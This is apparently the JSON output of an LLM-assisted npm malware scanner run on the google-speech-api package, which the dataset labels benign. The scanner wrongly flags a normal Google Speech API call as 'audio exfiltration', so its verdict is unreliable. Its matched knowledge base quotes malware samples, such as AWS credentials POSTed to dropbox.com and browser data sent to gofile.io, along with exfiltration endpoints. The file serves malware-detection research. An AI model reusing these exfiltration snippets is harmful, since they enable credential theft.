@@ -1,0 +1,511 @@
+{
+  "package_name": "google-speech-api",
+  "package_version": "1.2.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:32:35.985147",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": true,
+  "total_files": 2,
+  "malicious_files": 1,
+  "total_slices": 1,
+  "malicious_slices": 1,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/google-speech-api/1.2.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/google-speech-api/1.2.0/package/index.js",
+      "status": "success",
+      "is_malicious": true,
+      "total_slices": 1,
+      "malicious_slices": 1,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var _ = require('lodash');\nvar async = require('async');\nvar EventEmitter = require('events').EventEmitter;\nvar ffmpeg = require('fluent-ffmpeg');\nvar fs = require('fs');\nvar request = require('superagent');\nvar temp = require('temp');\n\nvar defaults = {\n  client: 'chromium',\n  clipSize: 15,\n  lang: 'en-US',\n  maxRequests: 4,\n  maxResults: 1,\n  pfilter: 1,\n  sampleRate: 44000,\n  timeout: 6000,\n  xjerr: 1\n};\n\nmodule.exports = function (options, callback) {\n  var opts = _.merge({}, defaults, options || {});\n  var finishedReadingFile = false;\n\n  var queue = async.priorityQueue(\n    processClip,\n    opts.maxRequests\n  );\n\n  queue.events = new EventEmitter();\n  queue.results = [];\n\n  var reader = new EventEmitter();\n\n  reader.open = function (file) {\n    var self = this;\n\n    ffmpeg.ffprobe(file, function (err, info) {\n      if (err) return self.emit('error', err);\n      var fileSize = info.format.duration;\n      var clipCount = Math.ceil(fileSize / opts.clipSize);\n      var clips = _.range(clipCount);\n\n      function readClip(i, done) {\n        var output = temp.path({suffix: '.flac'});\n\n        ffmpeg()\n          .on('error', function (err) {\n            self.emit('error', err);\n            done(err);\n          })\n          .on('end', function () {\n            self.emit('clip', output, i);\n            done(null, output);\n          })\n          .input(file)\n          .setStartTime(i * opts.clipSize)\n          .duration(opts.clipSize)\n          .output(output)\n          .audioFrequency(opts.sampleRate)\n          .toFormat('flac')\n          .run();\n      }\n\n      function end() {\n        self.emit('end');\n      }\n\n      async.map(clips, readClip, end);\n    });\n  };\n\n  function processClip(clip, done) {\n    transcribeClip(clip, function (err, result) {\n      fs.unlink(clip);\n      if (!err) return done(null, queue.results.push(result));\n      queue.events.emit('error', err);\n      done(err);\n    });\n  }\n\n  function transcribeClip(clip, done) {\n    fs.readFile(clip, function (err, data) {\n      if (err) return done(err);\n\n      request\n        .post('https://www.google.com/speech-api/v2/recognize')\n        .type('audio/x-flac; rate=' + opts.sampleRate)\n        .parse(request.parse.text)\n        .query({key: opts.key})\n        .query({lang: opts.lang})\n        .query({maxResults: opts.maxResults})\n        .query({pfilter: opts.pfilter ? 1 : 0})\n        .send(data)\n        .timeout(opts.timeout)\n        .end(function (err, res) {\n          if (err) return done(err);\n          var text = res.text;\n          if (text) text = text.split('\\n')[1];\n          if (!text) return done(null, {result: []});\n          try {\n            done(null, JSON.parse(text));\n          } catch (ex) {\n            done(ex);\n          }\n        });\n    });\n  }\n\n  reader.on('clip', function (clip, i) {\n    queue.push(clip, i);\n  });\n\n  reader.on('end', function () {\n    finishedReadingFile = true;\n  });\n\n  reader.on('error', function (err) {\n    callback(err);\n  });\n\n  queue.drain = function () {\n    if (!finishedReadingFile) return;\n    callback(null, queue.results);\n  };\n\n  queue.events.on('error', function (err) {\n    queue.kill();\n    callback(err);\n  });\n\n  if (opts.file) {\n    return reader.open(opts.file);\n  }\n\n  var file = temp.openSync().path;\n  var writeStream = fs.createWriteStream(file);\n\n  reader.on('end', function () {\n    fs.unlink(file);\n  });\n\n  reader.on('error', function () {\n    fs.unlink(file);\n  });\n\n  queue.events.on('error', function () {\n    fs.unlink(file);\n  });\n\n  writeStream.on('end', function () {\n    reader.open(file);\n  });\n\n  writeStream.on('close', function () {\n    reader.open(file);\n  });\n\n  writeStream.on('error', function () {\n    callback(err);\n  });\n\n  return writeStream;\n};",
+          "is_malicious": true,
+          "malice_score": 0.521280453602473,
+          "confidence": 0.75,
+          "behavior_summary": "When called, the code reads audio files, splits them into clips using ffmpeg, and reads each clip from disk using fs.readFile. It then sends the audio data via HTTPS POST requests to the hardcoded URL https://www.google.com/speech-api/v2/recognize using the superagent request library, including query parameters such as opts.key, opts.lang, and opts.maxResults. The code processes the JSON response from the Google Speech API and collects transcription results. This behavior enables audio data exfiltration to the Google speech recognition service, potentially leaking sensitive audio content.",
+          "explanation": "[LLM Judgment: Malicious] The analyzed code reads local audio files, splits them into clips, and sends these clips via HTTPS POST requests to a hardcoded external endpoint (Google Speech API) for transcription. This behavior constitutes automated data exfiltration of potentially sensitive audio data. While the code uses legitimate libraries and APIs (ffmpeg, fs, superagent), the automated and silent transmission of raw audio data to an external service without explicit user notification or consent aligns with data exfiltration patterns seen in malware. Compared to the knowledge base examples, although the destination and data type differ (audio vs. system/browser data), the core malicious pattern of reading local data and sending it out over the network without user interaction is present. The code does not show obfuscation or direct credential theft, but the exfiltration of raw audio data is a privacy risk and can be considered malicious in contexts where user consent is absent or the data is sensitive. | Malicious Behavior: Exfiltration of audio data to an external speech recognition service without explicit user consent, potentially leaking sensitive audio content.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240708_171641_007733_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps) (NSIS installer (Electron app distribution))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171641_007733/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5381014347076416,
+              "code_similarity": 0.45607882738113403,
+              "behavior_similarity": 0.620124101638794,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst os = require('os');\nconst fs = require('fs');\nconst fetch = require('node-fetch');\n\n// Collect system info\nconst sysInfo = os.userInfo();\nconst browserHistory = fs.readFileSync('path/to/browser/history');\nconst credentials = fs.readFileSync('path/to/credentials');\n\n// Exfiltrate to gofile\nfetch('https://gofile.io/upload', {\n  method: 'POST',\n  body: { sysInfo, browserHistory, credentials }\n});",
+                "code_behavior": "At runtime (upon application execution), the code collects system information, browser history, and credentials from the filesystem using Node.js APIs, then sends this data via an outbound HTTP POST request to the gofile.io file-sharing service, resulting in exfiltration of sensitive user data to an external attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive files such as browser history and credential stores, then transmits this data to an external file-sharing service (gofile.io) without user knowledge or consent. This behavior is characteristic of infostealer malware.",
+                  "violated_expectations": "Legitimate Electron applications should not access or transmit user credentials, browser history, or detailed system information without explicit user consent and clear disclosure. Accessing and exfiltrating such data is a direct violation of user privacy and security expectations.",
+                  "similar_legitimate_use": "Some legitimate applications may collect anonymized telemetry or crash logs, but they do not access credential stores or browser histories, and always request user consent for any data collection or transmission.",
+                  "key_indicators": [
+                    "Direct file access to browser history and credential files from within Electron app resources",
+                    "Outbound HTTP POST requests to gofile.io/upload or similar file-sharing endpoints",
+                    "Node.js code embedded in .asar archives performing OS-level data harvesting",
+                    "Absence of user prompts or consent dialogs for sensitive data access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "at runtime (upon application execution)",
+                  "file_location": "app\\resources\\app.asar\\a.js",
+                  "required_permissions": [
+                    "filesystem (read access to browser and credential files)",
+                    "network (outbound HTTP POST requests)",
+                    "environment_vars (access to user/system information)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps)",
+                  "package_manager": "NSIS installer (Electron app distribution)",
+                  "package_versions": "Unknown (all observed hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "These packages are Electron-based desktop applications distributed via NSIS installers that contain malicious Node.js code within their .asar archives. The code is designed to harvest sensitive user data, including system information, browser histories, and credentials, and exfiltrate it to external file-sharing services such as gofile.io. The applications masquerade as legitimate software to evade detection and facilitate data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and executes a trojanized Electron app distributed as an NSIS installer.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious Electron app is installed and launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Electron app unpacks and executes Node.js code from the .asar archive (a.js) upon application startup.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into memory and prepared for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects system information, browser history, and credentials from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is gathered from the victim's machine."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to gofile.io via HTTP POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data via the file-sharing service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser history and credential files without user consent",
+                    "Electron app making outbound HTTP POST requests to file-sharing services such as gofile.io",
+                    "Node.js code within .asar archives performing OS-level data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious .asar files in Electron app resources (e.g., app\\resources\\app.asar\\a.js)",
+                    "NSIS installer files with hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://gofile.io/upload from Electron app processes",
+                    "Unusual HTTP POST requests containing system or credential data to file-sharing domains"
+                  ],
+                  "how_to_detect": "Monitor Electron-based applications for unauthorized access to sensitive files such as browser history and credential stores. Inspect .asar archives for embedded Node.js scripts that perform data harvesting or exfiltration. Flag NSIS installers with known malicious hashes or those that unpack Electron apps exhibiting these behaviors. Monitor network traffic for outbound HTTP POST requests to gofile.io/upload or similar file-sharing services originating from Electron app processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_2",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5186136364936829,
+              "code_similarity": 0.46555858850479126,
+              "behavior_similarity": 0.5716686844825745,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "telegraPh: async (_0x3d2eed) => {\n  try {\n    const { ext: _0xa852ef } = await fromBuffer(_0x3d2eed),\n      _0x4e049a = await createFormData(_0x3d2eed, 'file', _0xa852ef),\n      _0x50070e = await fetch('https://telegra.ph/upload', {\n        method: 'POST',\n        body: _0x4e049a,\n      }),\n      _0x6354d9 = await _0x50070e.json();\n    if (_0x6354d9.error) {\n      throw _0x6354d9.error;\n    }\n    return 'https://telegra.ph' + _0x6354d9[0].src;\n  } catch (_0x574189) {\n    throw false;\n  }\n}",
+                "code_behavior": "At runtime, the code uploads arbitrary file data to https://telegra.ph/upload via HTTP POST, sending the file as form-data and returning the resulting URL, enabling silent exfiltration of user files.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated file uploads to external services without user interaction are a hallmark of data exfiltration and are not justified in the context of WhatsApp automation.",
+                  "violated_expectations": "A WhatsApp automation package should not upload arbitrary files to third-party file-sharing services, especially without user notification or consent.",
+                  "similar_legitimate_use": "A legitimate file-sharing client or backup tool may upload files, but only with user consent and clear intent.",
+                  "key_indicators": [
+                    "Hardcoded upload endpoint (telegra.ph)",
+                    "No user notification or consent before upload",
+                    "Automated network exfiltration of file data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133830_348434_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants) (NSIS installer (Electron app bundle))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133830_348434/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5180602073669434,
+              "code_similarity": 0.4515919089317322,
+              "behavior_similarity": 0.5845285058021545,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst fs = require('fs');\nconst os = require('os');\nconst browserData = getBrowserData();\nconst credentials = getCredentials();\nconst systemInfo = getSystemInfo();\nconst payload = { browserData, credentials, systemInfo };\n\nuploadToGofile(payload);",
+                "code_behavior": "At runtime, after installation and on app launch, the code uses Node.js APIs to collect system information, browser histories, and credentials from the victim's machine, packages this data, and sends it via network requests to the gofile file-sharing service, resulting in exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically harvests sensitive user data (system info, browser histories, credentials) and exfiltrates it to an external file-sharing service (gofile.io), which is a hallmark of infostealer malware.",
+                  "violated_expectations": "A legitimate Electron application should not access or transmit browser histories, credentials, or system information without explicit user consent, nor should it upload such data to anonymous third-party file-sharing services.",
+                  "similar_legitimate_use": "Some legitimate diagnostic or support tools may collect system information for troubleshooting, but they do not access browser credentials or upload sensitive data to anonymous file-sharing services.",
+                  "key_indicators": [
+                    "Access to browser data and credential stores via Node.js APIs",
+                    "Collection of system information using Node.js modules (e.g., os, fs)",
+                    "Network exfiltration to gofile.io or similar file-sharing domains",
+                    "Malicious logic embedded in Electron app's asar archive (e.g., a.js)",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, after installation and on app launch",
+                  "file_location": "app\\resources\\app.asar > a.js (Node.js script inside Electron app bundle)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants)",
+                  "package_manager": "NSIS installer (Electron app bundle)",
+                  "package_versions": "Unknown (malicious samples: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "The entire package is malicious because it masquerades as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe), but actually installs and executes an Electron-based infostealer. The malware leverages Node.js capabilities within the Electron framework to harvest sensitive data such as system information, browser histories, and credentials, and exfiltrates this data to external file-sharing services like gofile.io. The use of NSIS installers and Electron's asar archive structure is intended to evade detection and facilitate stealthy data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs the NSIS installer masquerading as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Installation and execution of the bundled Electron app."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NSIS installer executes the Electron app, which loads the malicious Node.js code from the asar archive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution within the Electron app context."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects sensitive data (system information, browser histories, credentials) from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of harvested data for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to the gofile file-sharing service via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data, achieving the final objective of data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser data and credentials via Node.js APIs shortly after installation or first run",
+                    "Network connections to file-sharing services (e.g., gofile.io) initiated by Electron-based applications",
+                    "Electron apps bundled in NSIS installers that immediately execute the main app post-installation",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.asar archive containing suspicious Node.js scripts (e.g., a.js) within Electron app resources",
+                    "NSIS installer files with names mimicking popular software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe)",
+                    "Electron app bundles with embedded scripts referencing credential or browser data APIs"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to gofile.io or similar file-sharing domains from Electron app processes",
+                    "Unusual POST requests containing system, browser, or credential data to external file-sharing services",
+                    "Network activity from newly installed Electron apps to non-standard domains immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor for Electron-based applications that, upon installation or first run, access browser credential stores, system information, or user data, and then initiate outbound connections to file-sharing or data exfiltration services such as gofile.io. Inspect Electron app asar archives for Node.js scripts that reference credential or browser data APIs. Flag NSIS installers that immediately execute bundled Electron apps, especially if the app is not from a verified publisher or is distributed outside official channels. Correlate file, process, and network activity to identify infostealer behavior patterns."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780168_snippet_1",
+              "source_package": "0xengine/xmlrpc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780168/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.500555157661438,
+              "code_similarity": 0.47188514471054077,
+              "behavior_similarity": 0.52922523021698,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\nhttps.request({hostname: 'dropbox.com', path: '/upload', method: 'POST'}, req => req.end(creds));",
+                "code_behavior": "At runtime, the code reads AWS credentials from the local filesystem, transmits them via an HTTPS POST request to dropbox.com, resulting in unauthorized credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses the user's AWS credentials file and sends its contents to an external domain (dropbox.com) without user knowledge or consent, which is a clear indicator of infostealer malware.",
+                  "violated_expectations": "A legitimate npm package should never access or transmit sensitive credential files such as ~/.aws/credentials without explicit user consent and a valid, transparent purpose.",
+                  "similar_legitimate_use": "Automated backup tools may upload credentials to a secure, organization-controlled vault, but never to public file-sharing services like Dropbox.",
+                  "key_indicators": [
+                    "Reads ~/.aws/credentials file",
+                    "Initiates outbound HTTPS POST to dropbox.com/upload",
+                    "No user interaction or consent required",
+                    "Hardcoded external destination for sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "package.json (npm package entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "0xengine/xmlrpc",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions in trojanized repos)",
+                  "why_malicious": "The package is a trojanized dependency distributed via fake GitHub repositories and phishing campaigns. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors. The malicious behaviors are embedded in the package entry point and in a downloaded second-stage payload, enabling credential theft, remote code execution, and persistent compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim downloads and installs a trojanized npm package (0xengine/xmlrpc) from a fake GitHub repository or via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes code to steal credentials (WordPress, SSH, AWS) and exfiltrate them to Dropbox.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package downloads and executes a second-stage payload (xmrdropper) from codeberg.org.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Deployment of additional malware"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Second-stage payload collects further data (e.g., shell history) and exfiltrates it to file.io.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Extended data exfiltration and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt",
+                    "npm package making outbound HTTPS POST requests to dropbox.com/upload or file.io",
+                    "Execution of remote shell scripts fetched from codeberg.org or similar untrusted platforms",
+                    "Creation and exfiltration of temporary files containing shell history or environment variables"
+                  ],
+                  "file_indicators": [
+                    "Presence of 0xengine/xmlrpc in node_modules directory",
+                    "Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt by npm processes",
+                    "Creation of /tmp/.hist file containing shell history"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to dropbox.com/upload",
+                    "Outbound file uploads to file.io via curl",
+                    "Connections to codeberg.org for remote script downloads"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected access to sensitive files such as AWS credentials, SSH keys, or WordPress credentials. Flag any npm package that initiates outbound connections to dropbox.com, file.io, or codeberg.org. Detect execution of shell scripts fetched from remote sources, especially those using curl piped to bash. Alert on exfiltration of shell history or environment variables to public file-sharing services. Correlate file creation events (e.g., /tmp/.hist) with network uploads to identify data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113708_595271_snippet_2",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113708_595271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4989541471004486,
+              "code_similarity": 0.4144255518913269,
+              "behavior_similarity": 0.5834827423095703,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Example pseudo-code\nconst screenshot = require('screenshot-desktop');\nscreenshot().then((img) => {\n  // send img to remote server\n});\n\nconst NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // send data to remote server\n});",
+                "code_behavior": "At runtime, the code captures screenshots and webcam images using system APIs or npm modules, then exfiltrates the captured media to a remote server via network requests, resulting in unauthorized surveillance.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the screen and camera without user consent and sending the data externally is a hallmark of spyware and privacy violation.",
+                  "violated_expectations": "Normal npm packages should not access or exfiltrate screen or camera data unless explicitly designed for such purposes with user awareness and consent.",
+                  "similar_legitimate_use": "Video conferencing or screenshot tools may access these resources, but only with user consent and without silent exfiltration to unknown servers.",
+                  "key_indicators": [
+                    "Use of screenshot-desktop or node-webcam modules for image capture",
+                    "Silent capture of screenshots or webcam images without user notification",
+                    "Network exfiltration of image data to remote servers",
+                    "Absence of user prompts or consent dialogs for camera/screen access"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main JavaScript file or auxiliary modules",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "camera",
+                    "screen",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is considered malicious because it abuses a legitimate password-recovery tool (ChromePass) to steal credentials from Google Chrome, and provides additional capabilities such as unauthorized screen and camera access, directory enumeration, and remote shell command execution. These behaviors are not expected in legitimate npm packages and indicate clear intent to exfiltrate sensitive user data and enable remote control of the victim's system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed on the victim's system.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code at runtime"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At runtime, the package executes ChromePass.exe to extract Chrome passwords and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package captures screenshots and webcam images, then exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and privacy violation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package lists directories on the victim's filesystem and sends the information to a remote server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reconnaissance for further exploitation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "The package enables remote shell command execution, allowing attackers to control the victim's system and maintain persistence.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full remote compromise and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or similar credential extraction tools from within npm packages",
+                    "Silent screenshot or webcam capture using screenshot-desktop or node-webcam modules followed by network exfiltration",
+                    "Automated directory listing of user or system directories and exfiltration of file lists",
+                    "Remote command execution via child_process.exec or similar APIs, especially when commands originate from network sources"
+                  ],
+                  "file_indicators": [
+                    "Bundled or downloaded ChromePass.exe binary within the package directory",
+                    "Creation of temporary files such as passwords.txt in user-accessible directories",
+                    "Unusual or unauthorized use of screenshot-desktop or node-webcam modules in non-UI npm packages"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known command-and-control or exfiltration domains immediately after package installation or execution",
+                    "HTTP POST requests containing credential dumps, screenshots, webcam images, or directory listings",
+                    "Unusual network traffic patterns from node.js processes, especially following execution of external binaries or system commands"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that execute external binaries such as ChromePass.exe, access camera or screen APIs, or perform directory listing and exfiltration. Flag packages that initiate outbound network connections immediately after installation or at runtime, especially those sending sensitive files, images, or command outputs. Use endpoint security tools to detect suspicious process execution and network activity originating from node.js processes, and correlate with the presence of bundled binaries or unauthorized use of system resources."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
